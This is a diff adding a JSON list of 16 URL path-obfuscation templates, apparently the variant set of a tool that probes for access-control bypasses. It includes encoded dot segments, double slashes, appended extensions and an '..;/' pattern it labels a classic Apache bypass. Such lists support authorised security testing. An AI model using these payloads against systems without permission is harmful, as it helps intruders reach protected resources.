@@ -1,0 +1,82 @@
+[
+  {
+    "name": "basic",
+    "description": "Baseline request without obfuscation",
+    "path_template": "{origin}/{path}"
+  },
+  {
+    "name": "encoded-dot-segment",
+    "description": "Insert encoded dot segment before the path",
+    "path_template": "{origin}/%2e/{path}"
+  },
+  {
+    "name": "trailing-dot",
+    "description": "Append dot directory traversal",
+    "path_template": "{origin}/{path}/."
+  },
+  {
+    "name": "double-slashes",
+    "description": "Use double slashes before and after the path",
+    "path_template": "{origin}//{path}//"
+  },
+  {
+    "name": "dot-slash-walk",
+    "description": "Alternate dot slash segments around the path",
+    "path_template": "{origin}/./{path}/./"
+  },
+  {
+    "name": "encoded-space",
+    "description": "Append encoded space",
+    "path_template": "{origin}/{path}%20"
+  },
+  {
+    "name": "encoded-tab",
+    "description": "Append encoded tab",
+    "path_template": "{origin}/{path}%09"
+  },
+  {
+    "name": "trailing-question",
+    "description": "Add dangling question mark",
+    "path_template": "{origin}/{path}?"
+  },
+  {
+    "name": "html-extension",
+    "description": "Append .html extension",
+    "path_template": "{origin}/{path}.html"
+  },
+  {
+    "name": "junk-query",
+    "description": "Add bogus query segment",
+    "path_template": "{origin}/{path}/?anything"
+  },
+  {
+    "name": "fragment-suffix",
+    "description": "Append fragment marker",
+    "path_template": "{origin}/{path}#"
+  },
+  {
+    "name": "wildcard-suffix",
+    "description": "Append wildcard slash star suffix",
+    "path_template": "{origin}/{path}/*"
+  },
+  {
+    "name": "php-extension",
+    "description": "Append .php extension",
+    "path_template": "{origin}/{path}.php"
+  },
+  {
+    "name": "json-extension",
+    "description": "Append .json extension",
+    "path_template": "{origin}/{path}.json"
+  },
+  {
+    "name": "dot-dot-semi-slash",
+    "description": "Append classic apache bypass pattern",
+    "path_template": "{origin}/{path}..;/"
+  },
+  {
+    "name": "semicolon-slash",
+    "description": "Append semicolon slash combo",
+    "path_template": "{origin}/{path};/"
+  }
+]
